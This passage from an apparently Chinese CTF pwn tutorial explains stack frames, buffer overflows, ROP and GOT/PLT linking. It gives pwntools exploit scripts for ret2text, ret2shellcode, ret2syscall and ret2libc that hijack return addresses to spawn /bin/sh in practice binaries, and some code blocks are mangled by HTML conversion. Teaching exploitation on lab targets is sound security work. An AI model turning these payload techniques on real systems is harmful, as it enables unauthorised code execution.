用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。</li><li>ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。</li><li>eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</li></ul><p><strong>发生函数调用时，栈顶函数状态以及上述寄存器的变化</strong></p><blockquote><p>变化的核心任务是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态。</p></blockquote><ul><li><p>首先将被调用函数（callee）的参数按照逆序依次压入栈内。如果被调用函数（callee）不需要参数，则没有这一步骤。这些参数仍会保存在调用函数（caller）的函数状态内，之后压入栈内的数据都会作为被调用函数（callee）的函数状态来保存。</p></li><li><p>然后将调用函数（caller）进行调用之后的下一条指令地址作为返回地址压入栈内。这样调用函数（caller）的 eip（指令）信息得以保存。</p></li><li><p>再将当前的ebp 寄存器的值（也就是调用函数的基地址）压入栈内，并将 ebp 寄存器的值更新为当前栈顶的地址。这样调用函数（caller）的 ebp（基地址）信息得以保存。同时，ebp 被更新为被调用函数（callee）的基地址。</p></li><li><p>再之后是将被调用函数（callee）的局部变量等数据压入栈内。</p></li><li><p>在压栈的过程中，esp 寄存器的值不断减小（对应于栈从内存高地址向低地址生长）。压入栈内的数据包括调用参数、返回地址、调用函数的基地址，以及局部变量，其中调用参数以外的数据共同构成了被调用函数（callee）的状态。在发生调用时，程序还会将被调用函数（callee）的指令地址存到 eip 寄存器内，这样程序就可以依次执行被调用函数的指令了。</p></li></ul><p><strong>函数调用结束时的变化</strong></p><blockquote><p>变化的核心任务是丢弃被调用函数（callee）的状态，并将栈顶恢复为调用函数（caller）的状态。</p></blockquote><ul><li><p>首先被调用函数的局部变量会从栈内直接弹出，栈顶会指向被调用函数（callee）的基地址。</p></li><li><p>然后将基地址内存储的调用函数（caller）的基地址从栈内弹出，并存到 ebp 寄存器内。这样调用函数（caller）的 ebp（基地址）信息得以恢复。此时栈顶会指向返回地址。</p></li><li><p>再将返回地址从栈内弹出，并存到 eip 寄存器内。这样调用函数（caller）的 eip（指令）信息得以恢复。</p></li><li><p>至此调用函数（caller）的函数状态就全部恢复了，之后就是继续执行调用函数的指令了。</p></li></ul><p><strong>函数调用栈的工作方式（cdecl）</strong></p><ul><li>x86<ul><li>使用栈来传递参数</li><li>使用 eax 存放返回值</li></ul></li><li>amd64<ul><li>前6个参数依次存放于 rdi、rsi、rdx、rcx、r8、r9 寄存器中</li><li>第7个以后的参数存放于栈中</li></ul></li></ul><p><strong>缓冲区溢出（Buffer overflow）</strong></p><blockquote><p>本质是向定长的缓冲区中写入了超长的数据，造成超出的数据覆写了合法内存区域</p></blockquote><ul><li><p>栈溢出（Stack overflow）</p><ul><li>最常见、漏洞比例最高、危害最大的二进制漏洞</li><li>在 CTF PWN 中往往是漏洞利用的基础</li></ul></li><li><p>堆溢出（Heap overflow）</p><ul><li>堆管理器复杂，利用花样繁多</li><li>CTF PWN 中的常见题型</li></ul></li><li><p>Data段溢出</p><ul><li>攻击效果依赖于 Data段上存放了何种控制数据</li></ul></li></ul><p>介绍完背景知识，就可以继续回归栈溢出攻击的主题了。当函数正在执行内部指令的过程中我们无法拿到程序的控制权，只有在发生函数调用或者结束函数调用时，程序的控制权会在函数状态之间发生跳转，这时才可以通过修改函数状态来实现攻击。而控制程序执行指令最关键的寄存器就是 eip，所以我们的目标就是让 eip 载入攻击指令的地址。</p><p>先来看看函数调用结束时，如果要让 eip 指向攻击指令，需要哪些准备？首先，在退栈过程中，返回地址会被传给 eip，所以我们只需要让溢出数据用攻击指令的地址来覆盖返回地址就可以了。其次，我们可以在溢出数据内包含一段攻击指令，也可以在内存其他位置寻找可用的攻击指令。</p><p><img src="/2022/01/19/CTF/Pwn/Pwn/48d4fa4dd9ab1a5f7426e4eef3642de9.png" alt="image-20220121143254140" style="zoom:67%;"></p><ul><li><p>ret2text：篡改栈帧上的返回地址为程序中已有的后门函数</p><ul><li><p>ret_addr = backdoor_addr</p></li><li><p>```c<br>int get_shell()<br>{</p><pre><code>system(&quot;/bin/sh&quot;); //相当于在终端（shell）中执行/bin/sh，得到一个shellreturn 0;</code></pre><p>}</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><br>- ret2shellcode：篡改栈帧上的返回地址为攻击者手动传入的 <span class="hljs-keyword">shellcode </span>所在缓冲区地址<br>  - ret_addr = <span class="hljs-keyword">shellcode_addr</span><br><span class="hljs-keyword"></span>  - 初期往往将 <span class="hljs-keyword">shellcode </span>直接写入栈缓冲区<br>  - 目前由于 the NX <span class="hljs-keyword">bits </span>保护措施的开启，栈缓冲区不可执行，故当下的常用手段变为向 <span class="hljs-keyword">bss </span>缓冲区写入 <span class="hljs-keyword">shellcode </span>或向堆缓冲区写入 <span class="hljs-keyword">shellcode </span>并使用 mprotect 赋予其可执行权限<br><br><br><br><span class="hljs-comment">### 2、ret2text</span><br><br>**查看防护措施：**<br><br>```<span class="hljs-keyword">shell</span><br><span class="hljs-keyword"></span>$ checksec ret2text<br></code></pre></td></tr></table></figure></li></ul></li></ul><p><strong>gdb 调试：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb ret2text</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 打断点</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> b main <span class="hljs-comment"># 函数</span></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> b *0x8048000 <span class="hljs-comment"># 地址</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 运行、进入、下一个</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> r <span class="hljs-comment"># run</span></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> s <span class="hljs-comment"># step in</span></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> n <span class="hljs-comment"># next</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 查看栈</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> stack 24</span><br><br></code></pre></td></tr></table></figure><p><strong>exp.py：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2text&quot;</span>)<br>io.recvline()<br><br>get_shell_addr = <span class="hljs-number">0x8048522</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">16</span> + <span class="hljs-string">b&#x27;BBBB&#x27;</span> + p32(get_shell_addr)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="3、ret2shellcode"><a href="#3、ret2shellcode" class="headerlink" title="3、ret2shellcode"></a>3、ret2shellcode</h3><p><strong>生成 shellcode：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 32 bit</span><br>shellcraft.sh()<br><span class="hljs-built_in">print</span>(shellcraft.sh())<br><br>asm(shellcraft.sh())<br><span class="hljs-built_in">print</span>(asm(shellcraft.sh()))<br><br><span class="hljs-comment"># 64 bit</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>shellcraft.amd64.sh()<br></code></pre></td></tr></table></figure><p><strong>exp.py：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2shellcode&quot;</span>)<br><br>shellcode = asm(shellcraft.sh())<br>buf2_addr = <span class="hljs-number">0x804a080</span><br>payload = shellcode.ljust(<span class="hljs-number">112</span>,<span class="hljs-string">b&#x27;A&#x27;</span>) + p32(buf2_addr)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="4、ret2stack"><a href="#4、ret2stack" class="headerlink" title="4、ret2stack"></a>4、ret2stack</h3><p><img src="/2022/01/19/CTF/Pwn/Pwn/9ff0636bbf3d69e939555ed2a595ce92.png" alt="image-20220416150035544" style="zoom:67%;"></p><p><strong>exp.py：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># gdb调试和实际运行地址不一致</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>io = process(<span class="hljs-string">&quot;./ret2stack&quot;</span>)<br>io.recv()<br><br>shellcode = asm(shellcraft.amd64.sh())<br>buf_addr = <span class="hljs-number">0x804a080</span><br><br>payload = shellcode.ljust(<span class="hljs-number">120</span>,<span class="hljs-string">b&#x27;A&#x27;</span>) + p64(buf_addr)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="0x03-返回导向编程ROP"><a href="#0x03-返回导向编程ROP" class="headerlink" title="0x03 返回导向编程ROP"></a>0x03 返回导向编程ROP</h2><blockquote><p>ROP（Return Oriented Programming）</p></blockquote><h3 id="1、ret2syscall"><a href="#1、ret2syscall" class="headerlink" title="1、ret2syscall"></a>1、ret2syscall</h3><p><strong>什么是系统调用？</strong></p><ul><li><p>操作系统提供给用户的编程接口</p></li><li><p>是提供访问操作系统所管理的底层硬件的接口</p></li><li><p>本质上是一些内核函数代码，以规范的方式驱动硬件</p></li><li><p>x86 通过 int 0x80 指令进行系统调用、amd64 通过 syscall 指令进行系统调用</p></li></ul><p><strong>举例：my_puts() -&gt; write() -&gt; sys_write()</strong></p><ul><li><p>my_puts(“Hello world!”); </p><ul><li>程序 ELF 中的用户代码 </li></ul></li><li><p>write(1, &amp;”Hello world!”, 12); </p><ul><li>libc 中的用户代码</li></ul></li><li><p>[ eax = 4; ebx = 1; ecx = &amp;”Hello world!”; edx = 12; ] + int 0x80; =&gt; sys_write() </p><ul><li>Linux 内核中的内核代码</li></ul></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 用于打印程序或者库文件所依赖的共享库列表。</span><br><span class="hljs-meta">$</span><span class="bash"> ldd a.out</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,0xb<br>mov ebx,[&quot;/bin/sh&quot;] <br>mov ecx,0<br>mov edx,0<br>int 0x80<br>=&gt; execve(&quot;/bin/sh&quot;,NULL,NULL)<br></code></pre></td></tr></table></figure><p><strong>篡改栈帧上自返回地址开始的一段区域为一系列 gadget 的地址，最终调用目标系统调用。</strong></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/1fd38b16c7e1c8b6004cd0c52ac75b7d.png" alt="image-20220122144411306" style="zoom:50%;"></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/006c15054c65897c8e094024ee8c0692.png" alt="image-20220122144820069" style="zoom:50%;"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ROPgadget --binary ret2syscall --only <span class="hljs-string">&quot;pop|ret&quot;</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ROPgadget --binary ret2syscall --only <span class="hljs-string">&quot;pop|ret&quot;</span> | head</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ROPgadget --binary ret2syscall --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep eax</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ROPgadget --binary ret2syscall --only <span class="hljs-string">&quot;int&quot;</span></span> <br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = ELF(<span class="hljs-string">&quot;./ret2syscall&quot;</span>)<br><br><span class="hljs-built_in">hex</span>(<span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2syscall&quot;</span>)<br><br>pop_eax_ret = <span class="hljs-number">0x080bb196</span><br>pop_edx_ecx_ebx_ret = <span class="hljs-number">0x0806eb90</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br>bin_sh = <span class="hljs-number">0x80be408</span><br><br>payload = flat([<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, pop_eax_ret, <span class="hljs-number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, bin_sh, int_0x80])<br><span class="hljs-comment"># payload = b&#x27;A&#x27; * 112 + p32(pop_eax_ret) + p32(0xb) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(bin_sh) + p32(int_0x80)</span><br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="2、动态链接过程"><a href="#2、动态链接过程" class="headerlink" title="2、动态链接过程"></a>2、动态链接过程</h3><p><img src="/2022/01/19/CTF/Pwn/Pwn/50dcd703763d01496f75accb5ad58ec1.png" alt="image-20220410230349292" style="zoom: 60%;"></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/c702b48e0b9ab154044249db358579f3.png" alt="image-20220411133422810"></p><p><strong>.got、.plt、.got.plt 三个节</strong></p><ul><li><p>.got</p><ul><li>GOT(Global Offset Table)全局偏移表。</li><li>这是链接器为外部符号填充的实际偏移量。</li></ul></li><li><p>.plt</p><ul><li>PLT(Procedure Linkage Table)程序链接表。</li><li>作用是一个跳板，保存了某个符号在重定位表中的偏移量(用来第一次查找某个符号)和对应的 .got.plt 的对应的地址。</li><li>它有两个功能，要么在 .got.plt 节中拿到地址，并跳转。要么没有所需地址，触发链接器去找到所需的地址。</li></ul></li><li>.got.plt<ul><li>这个是GOT专门为PLT准备的节，保存了重定位地址。</li><li>.got.plt 中的值是GOT的一部分，它包含上述PLT表所需地址(已经找到的和需要去触发的)。</li></ul></li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/b5641f5f5523f0bfbd8100608aeedca3.png" alt="image-20220411141334555" style="zoom: 67%;"></p><ul><li><p>进程首次调用 <code>foo</code></p><ul><li>跳转到 <code>.plt</code> 中的 <code>foo</code> 表项，<code>.plt</code> 中的代码立即跳转到 <code>.got.plt</code> 中记录的地址</li><li>由于进程是第一次调用 <code>foo</code>，故 <code>.got.plt</code> 中记录的地址是 <code>foo@plt+6（push index）</code></li><li>回到 <code>.plt</code> ，解析 <code>foo</code> 的实际地址</li><li>跳转到 <code>.plt</code> 头部为 <code>dl_runtime_resolve</code> 函数传参，调用 <code>dl_runtime_resolve</code> 函数解析 <code>foo</code> 的实际地址</li><li><code>foo</code> 的实际地址被填入 <code>.got.plt</code> 中，此后 <code>.got.plt</code> 中保存的是 <code>foo</code> 的真实地址</li></ul></li><li><p>进程第二次调用 <code>foo</code></p><ul><li>直接自 <code>.got.plt</code> 跳转到 <code>foo</code> 的真实地址</li><li>没有了第一次的解析地址过程</li></ul></li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/51cc039bbe87f3deb995ad9943ddf2fc.png" alt="image-20220411141451294" style="zoom: 80%;"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gcc -fno-pie -o dyntest test.c<br><br>$ gcc -fno-pie --static -o statest test.c<br><br>$ gcc -fno-pie -g -m32 -o link dylink.c<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gdb link<br><br><span class="hljs-comment"># 查看plt、got内容</span><br>pwndbg&gt; plt<br>pwndbg&gt; got<br><br><span class="hljs-comment"># 查看内存地址中的值</span><br>pwndbg&gt; x 0x401030<br>pwndbg&gt; x/20 0x401030<br>pwndbg&gt; x/20x 0x7ffff7e65910<br>pwndbg&gt; x/20gx<br><br><span class="hljs-comment"># 反汇编</span><br>pwndbg&gt; disass 0x7ffff7e65910<br><br><span class="hljs-comment"># 有C语言代码</span><br>pwndbg&gt; b 9          <span class="hljs-comment"># 在行号9处打断点</span><br>pwndbg&gt; info b       <span class="hljs-comment"># 查看断点</span><br>pwndbg&gt; d 1          <span class="hljs-comment"># 删除编号1的断点</span><br><br>pwndbg&gt; start      <span class="hljs-comment"># 运行至main或者start处</span><br>pwndbg&gt; c          <span class="hljs-comment"># continue，继续执行</span><br>pwndbg&gt; backtrace  <span class="hljs-comment"># 函数调用栈</span><br>pwndbg&gt; <span class="hljs-built_in">return</span>     <span class="hljs-comment">#返回</span><br>pwndbg&gt; q          <span class="hljs-comment">#quit，退出 </span><br></code></pre></td></tr></table></figure><h3 id="3、ret2libc"><a href="#3、ret2libc" class="headerlink" title="3、ret2libc"></a>3、ret2libc</h3><p><strong>篡改栈帧上自返回地址开始的一段区域为一系列 gadget 的地址，最终调用 libc 中的函数获取 shell</strong></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/19ab0cf25f7e2fdd20541fa96a03b157.png" alt="image-20220416150937152"></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/1c81ca0aed75a2d75d45142ff9b4f90a.png" alt="image-20220416201555123"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2libc&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ret2libc&quot;</span>)<br><br><span class="hljs-built_in">hex</span>(elf.got[<span class="hljs-string">&quot;puts&quot;</span>])<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2libc1&quot;</span>)<br><br><span class="hljs-comment"># elf = ELF(&quot;./ret2libc1&quot;)</span><br><span class="hljs-comment"># system_plt = elf.plt[&quot;system&quot;]</span><br><span class="hljs-comment"># bin_sh = next(elf.search(b&quot;/bin/sh&quot;))</span><br><br>bin_sh = <span class="hljs-number">0x8048720</span><br>system_plt = <span class="hljs-number">0x8048460</span><br>payload = flat([<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, system_plt, <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">4</span>, bin_sh])<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2libc2&quot;</span>)<br><br><span class="hljs-comment"># elf = ELF(&quot;./ret2libc2&quot;)</span><br><span class="hljs-comment"># buf2 = elf.symbols[&quot;buf2&quot;]</span><br><span class="hljs-comment"># gets_plt = elf.plt[&quot;gets&quot;]</span><br><span class="hljs-comment"># system_plt = elf.plt[&quot;system&quot;]</span><br><br>gets_plt = <span class="hljs-number">0x8048460</span><br>system_plt = <span class="hljs-number">0x8048490</span><br>buf2 = <span class="hljs-number">0x804A080</span><br><br>payload = flat([<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, gets_plt, system_plt, buf2, buf2])<br>io.sendline(payload)<br>io.sendline(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br><br>io = process(<span class="hljs-string">&quot;./ret2libc2&quot;</span>)<br><br>gets_plt = <span class="hljs-number">0x8048460</span><br>system_plt = <span class="hljs-number">0x8048490</span><br>pop_ebx_ret = <span class="hljs-number">0x804843d</span><br>buf2 = <span class="hljs-number">0x804A080</span><br><br>payload = flat([<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, gets_plt, pop_ebx_ret, buf2, system_plt, <span class="hljs-number">0xdeadbeef</span>, buf2])<br>io.sendline(payload)<br>io.sendline(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>到目前为止我们只接触了内存空间分布已知的ROP，但在绝大部分赛题中，由于ASLR与PIE保护的开启，在发送攻击载荷（payload）之前，往往需要我们先泄露内存分布信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 注意 libc 版本问题</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br><br>io.sendlineafter(<span class="hljs-string">b&quot; :&quot;</span>, <span class="hljs-built_in">str</span>(elf.got[<span class="hljs-string">&quot;puts&quot;</span>]))<br>io.recvuntil(<span class="hljs-string">b&quot; : &quot;</span>)<br>libcBase = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>,drop = <span class="hljs-literal">True</span>),<span class="hljs-number">16</span>) - libc.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br><br>success(<span class="hljs-string">&quot;libcBase -&gt; &#123;:#x&#125;&quot;</span>.<span class="hljs-built_in">format</span>(libcBase))<br><span class="hljs-comment"># oneGadget = libcBase + 0x3a9fc</span><br><span class="hljs-comment"># payload = flat(cyclic(60),oneGadget)</span><br>payload = flat(cyclic(<span class="hljs-number">60</span>), libcBase+libc.symbols[<span class="hljs-string">&quot;system&quot;</span>], <span class="hljs-number">0xdeadbeef</span>, <span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;sh\x00&quot;</span>)))<br>io.sendlineafter(<span class="hljs-string">b&quot; :&quot;</span>,payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ one_gadget libc-2.23.so<br></code></pre></td></tr></table></figure><h3 id="4、其它的ROP技巧"><a href="#4、其它的ROP技巧" class="headerlink" title="4、其它的ROP技巧"></a>4、其它的ROP技巧</h3><p><strong>栈迁移</strong></p><ul><li><p>Definition：用 gadget 改变 esp 的值</p></li><li><p>Application</p><ul><li>栈溢出长度不足以使用直接 ROP</li><li>栈溢出 payload 会出现空字符截断，且gadget地址含有空字符</li><li>在泄露地址信息后需要新的 ROP payload</li></ul></li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/c44801137adffe5bc3305be656fe8953.png" alt="image-20220416205727509" style="zoom:67%;"></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/1c3ec8f61baef76c5b28e7aefd73347a.png" alt="image-20220416205917710"></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/0d6387bcf57e8e0f36b3feba2cc473e6.png" alt="image-20220417105217094" style="zoom:80%;"></p><p><strong>x64 ROP 使用 gadget 传递参数</strong></p><ul><li><p>pop rdi ; ret</p></li><li><p>pop rsi ; pop r15 ; ret ;</p></li><li><p>setting rdx and rcx is hard, no trivial gadgets</p></li><li>ret2csu</li></ul><p><strong>__libc_csu_init Gadgets for x64：</strong></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/90bd4f0b14c08380ca4bd454bdc34256.png" alt="image-20220416201917558" style="zoom:80%;"></p><h2 id="0x04-格式化字符串漏洞"><a href="#0x04-格式化字符串漏洞" class="headerlink" title="0x04 格式化字符串漏洞"></a>0x04 格式化字符串漏洞</h2><ul><li><p>泄露栈内存</p></li><li><p>泄露任意地址内存</p></li><li>篡改栈内存</li><li>篡改任意地址内存</li></ul><p><strong>Integer Overflow（整数溢出）</strong></p><ul><li><p>History</p><ul><li>European Space Agency spacecraft Cluster I’s satellites exploded because of integer overflow (1996)</li></ul></li><li><p>IO2BO</p><ul><li>Array index out of bounds</li></ul></li><li><p>Integer Overflow in Linux kernel</p><ul><li>CVE-2013-1763 Linux Kernel netlink message family number overflow</li></ul></li><li><p>Integer Overflow vulnerability can be regarded as some kind of logic bug.</p></li><li><p>Integer overflow itself cannot be exploited, 